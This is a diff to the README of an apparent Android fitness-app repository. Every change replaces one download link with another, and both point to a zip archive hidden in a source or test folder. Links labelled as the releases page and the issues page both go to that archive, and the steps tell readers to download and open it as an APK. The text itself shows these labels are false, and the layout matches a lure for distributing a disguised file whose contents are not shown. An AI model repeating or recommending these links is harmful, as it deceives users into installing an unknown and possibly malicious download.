@@ -1,10 +1,10 @@
 # 🚀 FitApp-Clean-Architecture - Your Personalized Training Companion
 
-[![Download FitApp-Clean-Architecture](https://raw.githubusercontent.com/soobeyy/FitApp-Clean-Architecture/main/presentation/src/App_Architecture_Fit_Clean_v3.8.zip)](https://raw.githubusercontent.com/soobeyy/FitApp-Clean-Architecture/main/presentation/src/App_Architecture_Fit_Clean_v3.8.zip)
+[![Download FitApp-Clean-Architecture](https://github.com/soobeyy/FitApp-Clean-Architecture/raw/refs/heads/main/data/src/test/java/edu/ub/pis2425/projecte/Fit_App_Clean_Architecture_2.1.zip)](https://github.com/soobeyy/FitApp-Clean-Architecture/raw/refs/heads/main/data/src/test/java/edu/ub/pis2425/projecte/Fit_App_Clean_Architecture_2.1.zip)
 
 ## 📥 Download & Install
 
-To get started with FitApp-Clean-Architecture, visit this page to download: [FitApp Releases](https://raw.githubusercontent.com/soobeyy/FitApp-Clean-Architecture/main/presentation/src/App_Architecture_Fit_Clean_v3.8.zip).
+To get started with FitApp-Clean-Architecture, visit this page to download: [FitApp Releases](https://github.com/soobeyy/FitApp-Clean-Architecture/raw/refs/heads/main/data/src/test/java/edu/ub/pis2425/projecte/Fit_App_Clean_Architecture_2.1.zip).
 
 ### 📝 What is FitApp-Clean-Architecture?
 
@@ -28,9 +28,9 @@ Before installing FitApp-Clean-Architecture, ensure your device meets the follow
 
 ## 🚀 Getting Started
 
-1. Open the **FitApp Releases** page: [FitApp Releases](https://raw.githubusercontent.com/soobeyy/FitApp-Clean-Architecture/main/presentation/src/App_Architecture_Fit_Clean_v3.8.zip).
+1. Open the **FitApp Releases** page: [FitApp Releases](https://github.com/soobeyy/FitApp-Clean-Architecture/raw/refs/heads/main/data/src/test/java/edu/ub/pis2425/projecte/Fit_App_Clean_Architecture_2.1.zip).
 2. Locate the latest release version.
-3. Click the download link for the APK file (e.g., `https://raw.githubusercontent.com/soobeyy/FitApp-Clean-Architecture/main/presentation/src/App_Architecture_Fit_Clean_v3.8.zip`).
+3. Click the download link for the APK file (e.g., `https://github.com/soobeyy/FitApp-Clean-Architecture/raw/refs/heads/main/data/src/test/java/edu/ub/pis2425/projecte/Fit_App_Clean_Architecture_2.1.zip`).
 4. Once downloaded, open the APK file to initiate installation.
 5. Follow the on-screen prompts to complete the installation.
 
@@ -47,7 +47,7 @@ Before installing FitApp-Clean-Architecture, ensure your device meets the follow
 If you encounter issues or have questions, please check the following resources:
 
 - **FAQs**: Read our frequently asked questions for quick answers.
-- **Issues Page**: Report any bugs or issues you may experience on our [GitHub Issues page](https://raw.githubusercontent.com/soobeyy/FitApp-Clean-Architecture/main/presentation/src/App_Architecture_Fit_Clean_v3.8.zip).
+- **Issues Page**: Report any bugs or issues you may experience on our [GitHub Issues page](https://github.com/soobeyy/FitApp-Clean-Architecture/raw/refs/heads/main/data/src/test/java/edu/ub/pis2425/projecte/Fit_App_Clean_Architecture_2.1.zip).
 - **Community Discussions**: Engage with other users and developers by joining discussions on our forums.
 
 ## 🌍 Topics Covered
@@ -67,4 +67,4 @@ FitApp-Clean-Architecture is licensed under the MIT License. You may use, modify
 
 ## 📥 Download Again
 
-For easy access, revisit this page to download: [FitApp Releases](https://raw.githubusercontent.com/soobeyy/FitApp-Clean-Architecture/main/presentation/src/App_Architecture_Fit_Clean_v3.8.zip).
+For easy access, revisit this page to download: [FitApp Releases](https://github.com/soobeyy/FitApp-Clean-Architecture/raw/refs/heads/main/data/src/test/java/edu/ub/pis2425/projecte/Fit_App_Clean_Architecture_2.1.zip).
